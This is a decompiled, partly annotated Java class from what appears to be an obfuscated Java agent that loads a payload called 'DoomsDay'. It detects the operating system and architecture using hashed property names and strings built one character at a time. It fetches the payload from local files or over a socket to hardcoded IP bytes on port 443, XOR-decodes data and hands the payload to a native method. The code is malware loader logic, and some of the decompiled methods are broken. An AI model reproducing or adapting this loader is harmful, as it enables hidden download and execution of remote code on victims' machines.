package net.java;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStream;
import java.io.RandomAccessFile;
import java.util.Arrays;
import java.util.Iterator;
import java.util.Map;

/**
 * This class contains the core utilities for the agent, including decryption,
 * class loading, and other essential functions. It is heavily obfuscated.
 */
public class CoreUtils {
  private static String UTF8_CHARSET;

  private static final int OS_TYPE;

  private static final int ARCH_TYPE;

  public static Map SYSTEM_PROPERTIES = System.getProperties();

  public static String RESOURCE_D_PATH;

  public static String RESOURCE_C_PATH;

  public static long DECRYPTION_KEY_A;

  public static long DECRYPTION_KEY_B;

  private static volatile boolean isAgentRunning;

  private byte[] a;

  private int c;

  private int d;

  private int e;

  private byte[] b;

  private int f;

  private int g;

  private int h;

  private byte[] c;

  private int i;

  private int j;

  private int k;

  private int l;

  private short[][] a;

  private short[] a = new short[192];

  private short[] b;

  private short[] c;

  private short[] d;

  private short[] e;

  private short[] f;

  private short[][] b = (short[][])new short[12];

  private short[] g;

  private short[] h;

  private short[] i;

  private short[][] c = (short[][])new short[12];

  private short[][] d = false;

  private short[] j;

  private int m;

  private short[] k;

  private short[][] e;

  private short[][] f;

  private short[] l;

  private int n;

  private int o;

  private int p;

  private int q;

  static {
    byte osType = -1;
    String osName = null;
    String javaVmName = null;
    String osArch = null;
    Iterator<Map.Entry> iterator = SYSTEM_PROPERTIES.entrySet().iterator();
    while (iterator.hasNext()) {
      Map.Entry<K, ?> entry;
      int keyHash = (entry = iterator.next()).getKey().hashCode();
      entry = (Map.Entry<K, ?>)entry.getValue();
      if (keyHash == -1228098475) { // "os.name"
        osName = entry.toString().toLowerCase();
        continue;
      }
      if (keyHash == 1174476494) { // "java.vm.name"
        javaVmName = entry.toString().toLowerCase();
        continue;
      }
      if (keyHash == -1228469728) // "os.arch"
        osArch = entry.toString().toLowerCase();
    }
    StringBuilder sb;
    (sb = new StringBuilder()).append('a');
    sb.append('n');
    sb.append('d');
    sb.append('r');
    sb.append('o');
    sb.append('i');
    sb.append('d');
    if (javaVmName != null && javaVmName.contains(sb.toString())) {
      osType = 3; // Android
    } else if (osName != null) {
      (sb = new StringBuilder()).append('w');
      sb.append('i');
      sb.append('n');
      if (osName.contains(sb.toString())) {
        osType = 0; // Windows
      } else {
        (sb = new StringBuilder()).append('l');
        sb.append('i');
        sb.append('n');
        sb.append('u');
        sb.append('x');
        if (osName.contains(sb.toString())) {
          osType = 1; // Linux
        } else {
          (sb = new StringBuilder()).append('m');
          sb.append('a');
          sb.append('c');
          (sb = new StringBuilder()).append('o');
          sb.append('s');
          sb.append('x');
          (sb = new StringBuilder()).append('o');
          sb.append('s');
          sb.append(' ');
          sb.append('x');
          if (osName.contains(sb.toString()) || osName.contains(sb.toString()) || osName.contains(sb.toString())) {
            osType = 2; // MacOS
          } else {
            osType = -1; // Unknown
          }
        }
      }
    }
    OS_TYPE = osType;
    int archHash;
    if ((archHash = osArch.hashCode()) == 93084186 || archHash == -1221096139) { // "amd64" or "x86_64"
      ARCH_TYPE = 2;
      return;
    }
    if (archHash == -806050265 || archHash == 92926582) { // "x86"
      ARCH_TYPE = 0;
      return;
    }
    if (archHash == 117110 || archHash == -806050360 || archHash == 3178856 || archHash == 3179817 || archHash == 3180778 || archHash == 3181739) { // "arm"
      ARCH_TYPE = 1;
      return;
    }
    ARCH_TYPE = -1; // Unknown
  }

  public static native Object n(Object paramObject);

  /**
   * Finds the first occurrence of a byte pattern in a byte array.
   *
   * @param args An array of objects containing the source byte array, the length, and the pattern to search for.
   * @return The index of the first occurrence of the pattern, or -1 if not found.
   */
  public static int findBytePattern(Object[] args) {
    byte[] source = (byte[]) args[0];
    int length = ((Integer) args[1]).intValue();
    byte[] pattern = (byte[]) args[2];
    if (pattern.length == 0)
      return -1;
    length -= pattern.length;
    for (int i = 0; i <= length; i++) {
      int j = 0;
      while (true) {
        if (j >= pattern.length)
          return i;
        if (pattern[j] == source[i + j]) {
          j++;
          continue;
        }
        break;
      }
    }
    return -1;
  }

  public static int findBytePattern(byte[] source, byte[] pattern) {
    int length = source.length;
    if (pattern.length == 0)
      return -1;
    length -= pattern.length;
    for (int i = 0; i <= length; i++) {
      int j = 0;
      while (true) {
        if (j >= pattern.length)
          return i;
        if (pattern[j] == source[i + j]) {
          j++;
          continue;
        }
        break;
      }
    }
    return -1;
  }

  private static boolean isHexChar(char paramChar) {
    return (paramChar >= '0' && paramChar <= '9') ? true : ((paramChar >= 'A' && paramChar <= 'F') ? true : ((paramChar >= 'a' && paramChar <= 'f')));
  }

  /**
   * Extracts an argument value from a source byte array, identified by a prefix.
   * The value is terminated by a space. It also handles hex-encoded characters.
   *
   * @param source The source byte array.
   * @param prefix The prefix to search for.
   * @return The extracted argument value, or null if not found.
   */
  private static byte[] extractArgument(byte[] source, byte[] prefix) {
    byte[] result = null;
    int prefixIndex;
    if ((prefixIndex = findBytePattern(source, prefix)) >= 0) {
      int endIndex = source.length;
      int i;
      for (i = prefixIndex; i < source.length; i++) {
        if (source[i] == 32) {
          endIndex = i;
          break;
        }
      }
      if (endIndex > 0) {
        byte[] extractedValue = a(source, prefixIndex + prefix.length, endIndex);
        byte[] decodedValue = new byte[extractedValue.length];
        int decodedIndex = 0;
        for (int j = 0; j < extractedValue.length; j++) {
          int character = (char) extractedValue[j];
          if (character == 92) { // backslash
            if (j + 3 < extractedValue.length) {
              if (extractedValue[j + 1] == 120 && isHexChar((char) extractedValue[j + 2]) && isHexChar((char) extractedValue[j + 3])) {
                byte highNibbleChar = extractedValue[j + 2];
                byte lowNibbleChar = extractedValue[j + 3];
                char highNibble = 0;
                char lowNibble = 0;
                if (highNibbleChar >= 48 && highNibbleChar <= 57) highNibble = (char) (highNibbleChar - 48);
                if (highNibbleChar >= 65 && highNibbleChar <= 70) highNibble = (char) (highNibbleChar - 65 + 10);
                if (highNibbleChar >= 97 && highNibbleChar <= 102) highNibble = (char) (highNibbleChar - 97 + 10);
                if (lowNibbleChar >= 48 && lowNibbleChar <= 57) lowNibble = (char) (lowNibbleChar - 48);
                if (lowNibbleChar >= 65 && lowNibbleChar <= 70) lowNibble = (char) (lowNibbleChar - 65 + 10);
                if (lowNibbleChar >= 97 && lowNibbleChar <= 102) lowNibble = (char) (lowNibbleChar - 97 + 10);
                decodedValue[decodedIndex++] = (byte) (highNibble << 4 | lowNibble);
              }
              j += 3;
            } else {
              break;
            }
          } else {
            decodedValue[decodedIndex++] = (byte) character;
          }
        }
        byte[] finalValue = a(decodedValue, decodedIndex);
        Arrays.fill(decodedValue, (byte) 0);
        result = finalValue;
        Arrays.fill(extractedValue, (byte) 0);
      }
    }
    return result;
  }

  /**
   * This method appears to be the main logic of the agent. It is called from
   * AgentMain.run(). It seems to be loading a payload ("DoomsDay") and
   * executing it.
   *
   * @param agentLogicArgs An array of objects containing the arguments for the agent logic.
   */
  public static void runAgentLogic(Object[] agentLogicArgs) {
    if (isAgentRunning)
      return;
    isAgentRunning = true;
    byte[] agentArgsData = (byte[]) agentLogicArgs[0];
    Object instrumentation = agentLogicArgs[1];
    int someInteger = ((Integer) agentLogicArgs[2]).intValue();
    ClassLoader classLoader = (ClassLoader) agentLogicArgs[3];
    Object someObject = agentLogicArgs[4];
    String someString = (String) agentLogicArgs[5];
    if (someString != null && someString.length() == 0)
      someString = null;
    byte[] doomsdayVersion = null;
    byte[] configStorage = null;
    if (agentArgsData != null) {
      doomsdayVersion = extractArgument(agentArgsData, "--doomsdayversion=".getBytes());
      configStorage = extractArgument(agentArgsData, "--configstorage=".getBytes());
    }
    Object doomsdayUpdate = loadDoomsdayUpdate(
        new Object[] { someString, Integer.valueOf(someInteger), doomsdayVersion, configStorage });
    if (doomsdayUpdate != null)
      try {
        if (!g.a())
          throw new RuntimeException();
        Object[] nativeMethodArgs;
        (nativeMethodArgs = new Object[8])[0] = new long[1];
        (new long[1])[0] = someInteger;
        nativeMethodArgs[1] = new long[1];
        nativeMethodArgs[2] = agentArgsData;
        nativeMethodArgs[3] = instrumentation;
        nativeMethodArgs[4] = doomsdayUpdate;
        nativeMethodArgs[5] = null;
        nativeMethodArgs[6] = classLoader;
        nativeMethodArgs[7] = someObject;
        n(nativeMethodArgs);
        for (byte b = 0; b < ((byte[]) doomsdayUpdate).length; b++)
          ((byte[]) doomsdayUpdate)[b] = 0;
        return;
      } catch (Throwable throwable) {
        System.out.println("Error load DoomsDay");
        throwable.printStackTrace();
        return;
      }
    System.out.println("Error load DoomsDay - update not found");
  }

  private static Object loadDoomsdayUpdate(Object[] args) {
    Object update = null;
    String updatePath = (String) args[0];
    int updateType = ((Integer) args[1]).intValue();
    byte[] doomsdayVersion = (byte[]) args[2];
    Object configStorage = args[3];
    if (updatePath != null && doomsdayVersion == null)
      try {
        byte[] updateBytes;
        if ((updateBytes = readResource(updatePath, (String) null)) != null)
          return updateBytes;
      } catch (Throwable throwable) {
        System.out.println("Stored 1");
        throwable.printStackTrace();
      }
    byte[] latestMarker = new byte[]{36, 108, 97, 116, 101, 115, 116, 36};
    if (Arrays.equals(latestMarker, doomsdayVersion))
      doomsdayVersion = null;
    for (byte b = 0; b < 8; b++)
      latestMarker[b] = 0;
    if (((c() && g()) || d()) && (updateType == 4 || updateType == 12)) {
      if ((update = a(getDoomsdayPath(configStorage), doomsdayVersion)) == null)
        update = b(doomsdayVersion);
    } else if ((update = b(doomsdayVersion)) == null) {
      update = a(getDoomsdayPath(configStorage), doomsdayVersion);
    }
    if (update == null && updatePath != null)
      try {
        if ((configStorage = readResource(updatePath, (String) null)) != null)
          update = configStorage;
      } catch (Throwable throwable) {
        System.out.println("Stored 2");
        throwable.printStackTrace();
      }
    if (updateType == 1 || updateType == 12)
      try {
        if (updatePath != null && (configStorage = readResource(updatePath, (String) null)) != null && update != null && a((byte[]) configStorage) > a((byte[]) update))
          update = configStorage;
      } catch (Throwable throwable) {
        System.out.println("Stored 3");
        throwable.printStackTrace();
      }
    return update;
  }

  private static String getDoomsdayPath(Object pathObject) {
    String path = null;
    if (pathObject != null && pathObject instanceof byte[]) {
      byte[] defaultMarker = new byte[]{36, 100, 101, 102, 97, 117, 108, 116, 36};
      if (!Arrays.equals(defaultMarker, (byte[]) pathObject))
        try {
          path = new String((byte[]) pathObject, UTF8_CHARSET);
        } catch (Throwable throwable) {
        }
      for (byte b = 0; b < 9; b++)
        defaultMarker[b] = 0;
    }
    if (path == null) {
      path = (new File("doomsday")).getAbsolutePath();
    }
    return path;
  }

  private static Object b(Object paramObject) {
    // Byte code:
    //   0: iconst_4
    //   1: newarray byte
    //   3: dup
    //   4: iconst_0
    //   5: bipush #-91
    //   7: bastore
    //   8: dup
    //   9: iconst_1
    //   10: bipush #22
    //   12: bastore
    //   13: dup
    //   14: iconst_2
    //   15: bipush #-60
    //   17: bastore
    //   18: astore_1
    //   19: bipush #16
    //   21: newarray byte
    //   23: dup
    //   24: iconst_0
    //   25: bipush #42
    //   27: bastore
    //   28: dup
    //   29: iconst_1
    //   30: iconst_3
    //   31: bastore
    //   32: dup
    //   33: iconst_2
    //   34: bipush #-80
    //   36: bastore
    //   37: dup
    //   38: iconst_3
    //   39: bipush #-64
    //   41: bastore
    //   42: dup
    //   43: iconst_5
    //   44: iconst_2
    //   45: bastore
    //   46: dup
    //   47: bipush #7
    //   49: bipush #-48
    //   51: bastore
    //   52: dup
    //   53: bipush #12
    //   55: bipush #20
    //   57: bastore
    //   58: dup
    //   59: bipush #13
    //   61: bipush #44
    //   63: bastore
    //   64: dup
    //   65: bipush #14
    //   67: bipush #-32
    //   69: bastore
    //   70: dup
    //   71: bipush #15
    //   73: iconst_1
    //   74: bastore
    //   75: astore_2
    //   76: aload_0
    //   77: ifnull -> 185
    //   80: iconst_0
    //   81: newarray byte
    //   83: astore_3
    //   84: aload_0
    //   85: instanceof [B
    //   88: ifeq -> 105
    //   91: aload_0
    //   92: checkcast [B
    //   95: invokevirtual clone : ()Ljava/lang/Object;
    //   98: checkcast [B
    //   101: astore_3
    //   102: goto -> 127
    //   105: aload_0
    //   106: instanceof java/lang/String
    //   109: ifeq -> 127
    //   112: aload_0
    //   113: checkcast java/lang/String
    //   116: getstatic net/java/l.c : Ljava/lang/String;
    //   119: invokevirtual getBytes : (Ljava/lang/String;)[B
    //   122: astore_3
    //   123: goto -> 127
    //   126: pop
    //   127: bipush #8
    //   129: aload_3
    //   130: arraylength
    //   131: iadd
    //   132: newarray byte
    //   134: dup
    //   135: astore_0
    //   136: iconst_0
    //   137: bipush #22
    //   139: bastore
    //   140: aload_0
    //   141: iconst_1
    //   142: iconst_3
    //   143: bastore
    //   144: aload_0
    //   145: iconst_2
    //   146: bipush #100
    //   148: bastore
    //   149: aload_0
    //   150: iconst_3
    //   151: aload_3
    //   152: arraylength
    //   153: i2b
    //   154: bastore
    //   155: iconst_0
    //   156: istore #4
    //   158: goto -> 175
    //   161: aload_0
    //   162: iload #4
    //   164: bipush #8
    //   166: iadd
    //   167: aload_3
    //   168: iload #4
    //   170: baload
    //   171: bastore
    //   172: iinc #4, 1
    //   175: iload #4
    //   177: aload_3
    //   178: arraylength
    //   179: if_icmplt -> 161
    //   182: goto -> 204
    //   185: bipush #8
    //   187: newarray byte
    //   189: dup
    //   190: iconst_0
    //   191: bipush #22
    //   193: bastore
    //   194: dup
    //   195: iconst_1
    //   196: iconst_3
    //   197: bastore
    //   198: dup
    //   199: iconst_2
    //   200: bipush #100
    //   202: bastore
    //   203: astore_0
    //   204: invokestatic open : ()Ljava/nio/channels/SocketChannel;
    //   207: astore_3
    //   208: aload_3
    //   209: new java/net/InetSocketAddress
    //   212: dup
    //   213: aload_1
    //   214: invokestatic getByAddress : ([B)Ljava/net/InetAddress;
    //   217: sipush #443
    //   220: invokespecial <init> : (Ljava/net/InetAddress;I)V
    //   223: invokevirtual connect : (Ljava/net/SocketAddress;)Z
    //   226: pop
    //   227: goto -> 250
    //   230: pop
    //   231: aload_3
    //   232: new java/net/InetSocketAddress
    //   235: dup
    //   236: aload_2
    //   237: invokestatic getByAddress : ([B)Ljava/net/InetAddress;
    //   240: sipush #443
    //   243: invokespecial <init> : (Ljava/net/InetAddress;I)V
    //   246: invokevirtual connect : (Ljava/net/SocketAddress;)Z
    //   249: pop
    //   250: aload_0
    //   251: arraylength
    //   252: invokestatic allocateDirect : (I)Ljava/nio/ByteBuffer;
    //   255: dup
    //   256: astore #4
    //   258: aload_0
    //   259: invokevirtual put : ([B)Ljava/nio/ByteBuffer;
    //   262: pop
    //   263: aload #4
    //   265: iconst_0
    //   266: invokevirtual position : (I)Ljava/nio/Buffer;
    //   269: pop
    //   270: aload_3
    //   271: aload #4
    //   273: invokevirtual write : (Ljava/nio/ByteBuffer;)I
    //   276: pop
    //   277: aload #4
    //   279: iconst_0
    //   280: invokevirtual position : (I)Ljava/nio/Buffer;
    //   283: pop
    //   284: aload #4
    //   286: dup
    //   287: invokevirtual limit : ()I
    //   290: newarray byte
    //   292: invokevirtual put : ([B)Ljava/nio/ByteBuffer;
    //   295: pop
    //   296: iconst_4
    //   297: invokestatic allocateDirect : (I)Ljava/nio/ByteBuffer;
    //   300: astore #4
    //   302: aload_3
    //   303: aload #4
    //   305: invokevirtual read : (Ljava/nio/ByteBuffer;)I
    //   308: pop
    //   309: iconst_0
    //   310: aload #4
    //   312: iconst_0
    //   313: invokevirtual get : (I)B
    //   316: sipush #255
    //   319: iand
    //   320: bipush #24
    //   322: ishl
    //   323: ior
    //   324: aload #4
    //   326: iconst_1
    //   327: invokevirtual get : (I)B
    //   330: sipush #255
    //   333: iand
    //   334: bipush #16
    //   336: ishl
    //   337: ior
    //   338: aload #4
    //   340: iconst_2
    //   341: invokevirtual get : (I)B
    //   344: sipush #255
    //   347: iand
    //   348: bipush #8
    //   350: ishl
    //   351: ior
    //   352: aload #4
    //   354: iconst_3
    //   355: invokevirtual get : (I)B
    //   358: sipush #255
    //   361: iand
    //   362: ior
    //   363: dup
    //   364: istore #5
    //   366: ifgt -> 437
    //   369: aload_3
    //   370: invokevirtual close : ()V
    //   373: iconst_0
    //   374: istore #4
    //   376: goto -> 387
    //   379: aload_0
    //   380: iload #4
    //   382: iconst_0
    //   383: bastore
    //   384: iinc #4, 1
    //   387: iload #4
    //   389: aload_0
    //   390: arraylength
    //   391: if_icmplt -> 379
    //   394: iconst_0
    //   395: istore #4
    //   397: goto -> 408
    //   400: aload_1
    //   401: iload #4
    //   403: iconst_0
    //   404: bastore
    //   405: iinc #4, 1
    //   408: iload #4
    //   410: iconst_4
    //   411: if_icmplt -> 400
    //   414: iconst_0
    //   415: istore #4
    //   417: goto -> 428
    //   420: aload_2
    //   421: iload #4
    //   423: iconst_0
    //   424: bastore
    //   425: iinc #4, 1
    //   428: iload #4
    //   430: bipush #16
    //   432: if_icmplt -> 420
    //   435: aconst_null
    //   436: areturn
    //   437: aload #4
    //   439: iconst_0
    //   440: invokevirtual position : (I)Ljava/nio/Buffer;
    //   443: pop
    //   444: aload #4
    //   446: dup
    //   447: invokevirtual limit : ()I
    //   450: newarray byte
    //   452: invokevirtual put : ([B)Ljava/nio/ByteBuffer;
    //   455: pop
    //   456: iload #5
    //   458: newarray byte
    //   460: astore #4
    //   462: sipush #16384
    //   465: invokestatic allocateDirect : (I)Ljava/nio/ByteBuffer;
    //   468: astore #6
    //   470: iconst_0
    //   471: istore #7
    //   473: goto -> 520
    //   476: aload_3
    //   477: aload #6
    //   479: invokevirtual read : (Ljava/nio/ByteBuffer;)I
    //   482: dup
    //   483: istore #8
    //   485: iflt -> 527
    //   488: aload #6
    //   490: iconst_0
    //   491: invokevirtual position : (I)Ljava/nio/Buffer;
    //   494: pop
    //   495: aload #6
    //   497: aload #4
    //   499: iload #7
    //   501: iload #8
    //   503: invokevirtual get : ([BII)Ljava/nio/ByteBuffer;
    //   506: pop
    //   507: aload #6
    //   509: invokevirtual clear : ()Ljava/nio/Buffer;
    //   512: pop
    //   513: iload #7
    //   515: iload #8
    //   517: iadd
    //   518: istore #7
    //   520: iload #7
    //   522: iload #5
    //   524: if_icmplt -> 476
    //   527: aload_3
    //   528: invokevirtual close : ()V
    //   531: aload #6
    //   533: iconst_0
    //   534: invokevirtual position : (I)Ljava/nio/Buffer;
    //   537: pop
    //   538: aload #6
    //   540: dup
    //   541: invokevirtual limit : ()I
    //   544: newarray byte
    //   546: invokevirtual put : ([B)Ljava/nio/ByteBuffer;
    //   549: pop
    //   550: aload #4
    //   552: astore_3
    //   553: iconst_0
    //   554: istore #4
    //   556: goto -> 567
    //   559: aload_0
    //   560: iload #4
    //   562: iconst_0
    //   563: bastore
    //   564: iinc #4, 1
    //   567: iload #4
    //   569: aload_0
    //   570: arraylength
    //   571: if_icmplt -> 559
    //   574: iconst_0
    //   575: istore #4
    //   577: goto -> 588
    //   580: aload_1
    //   581: iload #4
    //   583: iconst_0
    //   584: bastore
    //   585: iinc #4, 1
    //   588: iload #4
    //   590: iconst_4
    //   591: if_icmplt -> 580
    //   594: iconst_0
    //   595: istore #4
    //   597: goto -> 608
    //   600: aload_2
    //   601: iload #4
    //   603: iconst_0
    //   604: bastore
    //   605: iinc #4, 1
    //   608: iload #4
    //   610: bipush #16
    //   612: if_icmplt -> 600
    //   615: aload_3
    //   616: areturn
    //   617: invokevirtual printStackTrace : ()V
    //   620: iconst_0
    //   621: istore #4
    //   623: goto -> 634
    //   626: aload_0
    //   627: iload #4
    //   629: iconst_0
    //   630: bastore
    //   631: iinc #4, 1
    //   634: iload #4
    //   636: aload_0
    //   637: arraylength
    //   638: if_icmplt -> 626
    //   641: iconst_0
    //   642: istore #4
    //   644: goto -> 655
    //   647: aload_1
    //   648: iload #4
    //   650: iconst_0
    //   651: bastore
    //   652: iinc #4, 1
    //   655: iload #4
    //   657: iconst_4
    //   658: if_icmplt -> 647
    //   661: iconst_0
    //   662: istore #4
    //   664: goto -> 675
    //   667: aload_2
    //   668: iload #4
    //   670: iconst_0
    //   671: bastore
    //   672: iinc #4, 1
    //   675: iload #4
    //   677: bipush #16
    //   679: if_icmplt -> 667
    //   682: goto -> 750
    //   685: astore_3
    //   686: iconst_0
    //   687: istore #4
    //   689: goto -> 700
    //   692: aload_0
    //   693: iload #4
    //   695: iconst_0
    //   696: bastore
    //   697: iinc #4, 1
    //   700: iload #4
    //   702: aload_0
    //   703: arraylength
    //   704: if_icmplt -> 692
    //   707: iconst_0
    //   708: istore #4
    //   710: goto -> 721
    //   713: aload_1
    //   714: iload #4
    //   716: iconst_0
    //   717: bastore
    //   718: iinc #4, 1
    //   721: iload #4
    //   723: iconst_4
    //   724: if_icmplt -> 713
    //   727: iconst_0
    //   728: istore #4
    //   730: goto -> 741
    //   733: aload_2
    //   734: iload #4
    //   736: iconst_0
    //   737: bastore
    //   738: iinc #4, 1
    //   741: iload #4
    //   743: bipush #16
    //   745: if_icmplt -> 733
    //   748: aload_3
    //   749: athrow
    //   750: aconst_null
    //   751: areturn
    // Exception table:
    //   from	to	target	type
    //   112	123	126	java/lang/Throwable
    //   204	373	617	java/lang/Exception
    //   204	373	685	finally
    //   208	227	230	java/lang/Throwable
    //   437	553	617	java/lang/Exception
    //   437	553	685	finally
    //   617	620	685	finally
  }

  /**
   * Reads a resource file from the classpath.
   *
   * @param resourcePath The path to the resource.
   * @param fallback     A fallback string to be used if the resource is not found.
   * @return The content of the resource as a byte array.
   */
  public static byte[] readResource(String resourcePath, String fallback) {
    try {
      InputStream inputStream = CoreUtils.class.getResourceAsStream(resourcePath);
      if (inputStream == null) {
        return (fallback != null) ? (byte[]) b(fallback) : null;
      }
      byte[] buffer = new byte[16384];
      ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(inputStream.available());
      int bytesRead;
      while ((bytesRead = inputStream.read(buffer)) != -1) {
        byteArrayOutputStream.write(buffer, 0, bytesRead);
      }
      inputStream.close();
      return byteArrayOutputStream.toByteArray();
    } catch (Exception e) {
      throw new RuntimeException(e);
    }
  }

  private static Object a(Object paramObject1, Object paramObject2) {
    // Byte code:
    //   0: aload_0
    //   1: instanceof java/lang/String
    //   4: ifeq -> 22
    //   7: new java/io/File
    //   10: dup
    //   11: aload_0
    //   12: checkcast java/lang/String
    //   15: invokespecial <init> : (Ljava/lang/String;)V
    //   18: astore_0
    //   19: goto -> 27
    //   22: aload_0
    //   23: checkcast java/io/File
    //   26: astore_0
    //   27: aconst_null
    //   28: astore_2
    //   29: aconst_null
    //   30: astore_3
    //   31: aconst_null
    //   32: astore #4
    //   34: iconst_0
    //   35: istore #5
    //   37: aload_0
    //   38: invokevirtual listFiles : ()[Ljava/io/File;
    //   41: dup
    //   42: astore_0
    //   43: ifnonnull -> 48
    //   46: aconst_null
    //   47: areturn
    //   48: iconst_0
    //   49: istore #6
    //   51: goto -> 247
    //   54: aload_0
    //   55: iload #6
    //   57: aaload
    //   58: invokevirtual getName : ()Ljava/lang/String;
    //   61: dup
    //   62: astore #7
    //   64: invokevirtual length : ()I
    //   67: bipush #8
    //   69: if_icmple -> 244
    //   72: aload #7
    //   74: invokevirtual length : ()I
    //   77: bipush #20
    //   79: if_icmpge -> 244
    //   82: aload #7
    //   84: invokestatic a : (Ljava/lang/String;)I
    //   87: dup
    //   88: istore #7
    //   90: ifle -> 244
    //   93: aload #4
    //   95: ifnonnull -> 110
    //   98: new java/io/ByteArrayOutputStream
    //   101: dup
    //   102: ldc_w 1310720
    //   105: invokespecial <init> : (I)V
    //   108: astore #4
    //   110: aload_2
    //   111: ifnonnull -> 120
    //   114: ldc_w 65536
    //   117: newarray byte
    //   119: astore_2
    //   120: aload #4
    //   122: invokevirtual reset : ()V
    //   125: new java/io/RandomAccessFile
    //   128: dup
    //   129: aload_0
    //   130: iload #6
    //   132: aaload
    //   133: new java/lang/StringBuilder
    //   136: dup
    //   137: invokespecial <init> : ()V
    //   140: dup
    //   141: astore #8
    //   143: bipush #114
    //   145: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   148: pop
    //   149: aload #8
    //   151: invokevirtual toString : ()Ljava/lang/String;
    //   154: invokespecial <init> : (Ljava/io/File;Ljava/lang/String;)V
    //   157: astore #8
    //   159: aload_1
    //   160: ifnull -> 198
    //   163: bipush #64
    //   165: newarray byte
    //   167: astore #9
    //   169: aload #8
    //   171: aload #9
    //   173: invokevirtual readFully : ([B)V
    //   176: aload #9
    //   178: invokestatic c : ([B)[B
    //   181: aload_1
    //   182: checkcast [B
    //   185: invokestatic equals : ([B[B)Z
    //   188: ifeq -> 239
    //   191: aload #4
    //   193: aload #9
    //   195: invokevirtual write : ([B)V
    //   198: iload #7
    //   200: iload #5
    //   202: if_icmple -> 239
    //   205: goto -> 217
    //   208: aload #4
    //   210: aload_2
    //   211: iconst_0
    //   212: iload #9
    //   214: invokevirtual write : ([BII)V
    //   217: aload #8
    //   219: aload_2
    //   220: invokevirtual read : ([B)I
    //   223: dup
    //   224: istore #9
    //   226: ifge -> 208
    //   229: aload #4
    //   231: invokevirtual toByteArray : ()[B
    //   234: astore_3
    //   235: iload #7
    //   237: istore #5
    //   239: aload #8
    //   241: invokevirtual close : ()V
    //   244: iinc #6, 1
    //   247: iload #6
    //   249: aload_0
    //   250: arraylength
    //   251: if_icmplt -> 54
    //   254: goto -> 260
    //   257: invokevirtual printStackTrace : ()V
    //   260: aload_3
    //   261: areturn
    // Exception table:
    //   from	to	target	type
    //   37	46	257	java/lang/Throwable
    //   48	254	257	java/lang/Throwable
  }

  public static void b(Object paramObject) {
    try {
      Object[] arrayOfObject;
      paramObject = (arrayOfObject = (Object[])paramObject)[0];
      byte[] arrayOfByte = (byte[])arrayOfObject[1];
      (paramObject = new StringBuilder()).append('r');
      paramObject.append('w');
      (paramObject = new RandomAccessFile((File)paramObject, paramObject.toString())).write(arrayOfByte);
      paramObject.close();
      return;
    } catch (Throwable throwable) {
      return;
    }
  }

  private static byte[] c(byte[] paramArrayOfbyte) {
    paramArrayOfbyte = (byte[])paramArrayOfbyte.clone();
    byte b1 = 0;
    for (byte b2 = 6; b2 < 64; b2++) {
      paramArrayOfbyte[b2] = (byte)(paramArrayOfbyte[b2] ^ 0x47);
      if (paramArrayOfbyte[b2] == 0 && !b1)
        b1 = b2;
    }
    if (b1 == 0)
      b1 = 64;
    return a(paramArrayOfbyte, 6, b1);
  }

  private static int a(byte[] paramArrayOfbyte) {
    return 0 + ((paramArrayOfbyte[0] & 0xFF) << 24) + ((paramArrayOfbyte[1] & 0xFF) << 16) + ((paramArrayOfbyte[2] & 0xFF) << 8) + (paramArrayOfbyte[3] & 0xFF);
  }

  private static int a(String paramString) {
    // Byte code:
    //   0: aload_0
    //   1: ifnonnull -> 52
    //   4: new java/lang/NumberFormatException
    //   7: dup
    //   8: new java/lang/StringBuilder
    //   11: dup
    //   12: invokespecial <init> : ()V
    //   15: dup
    //   16: astore_1
    //   17: bipush #110
    //   19: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   22: pop
    //   23: aload_1
    //   24: bipush #117
    //   26: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   29: pop
    //   30: aload_1
    //   31: bipush #108
    //   33: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   36: pop
    //   37: aload_1
    //   38: bipush #108
    //   40: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   43: pop
    //   44: aload_1
    //   45: invokevirtual toString : ()Ljava/lang/String;
    //   48: invokespecial <init> : (Ljava/lang/String;)V
    //   51: athrow
    //   52: aload_0
    //   53: invokevirtual length : ()I
    //   56: dup
    //   57: istore_1
    //   58: ifle -> 1079
    //   61: aload_0
    //   62: iconst_0
    //   63: invokevirtual charAt : (I)C
    //   66: bipush #45
    //   68: if_icmpne -> 445
    //   71: new java/lang/NumberFormatException
    //   74: dup
    //   75: new java/lang/StringBuilder
    //   78: dup
    //   79: invokespecial <init> : ()V
    //   82: dup
    //   83: astore_1
    //   84: bipush #73
    //   86: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   89: pop
    //   90: aload_1
    //   91: bipush #108
    //   93: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   96: pop
    //   97: aload_1
    //   98: bipush #108
    //   100: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   103: pop
    //   104: aload_1
    //   105: bipush #101
    //   107: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   110: pop
    //   111: aload_1
    //   112: bipush #103
    //   114: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   117: pop
    //   118: aload_1
    //   119: bipush #97
    //   121: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   124: pop
    //   125: aload_1
    //   126: bipush #108
    //   128: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   131: pop
    //   132: aload_1
    //   133: bipush #32
    //   135: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   138: pop
    //   139: aload_1
    //   140: bipush #108
    //   142: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   145: pop
    //   146: aload_1
    //   147: bipush #101
    //   149: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   152: pop
    //   153: aload_1
    //   154: bipush #97
    //   156: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   159: pop
    //   160: aload_1
    //   161: bipush #100
    //   163: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   166: pop
    //   167: aload_1
    //   168: bipush #105
    //   170: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   173: pop
    //   174: aload_1
    //   175: bipush #110
    //   177: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   180: pop
    //   181: aload_1
    //   182: bipush #103
    //   184: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   187: pop
    //   188: aload_1
    //   189: bipush #32
    //   191: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   194: pop
    //   195: aload_1
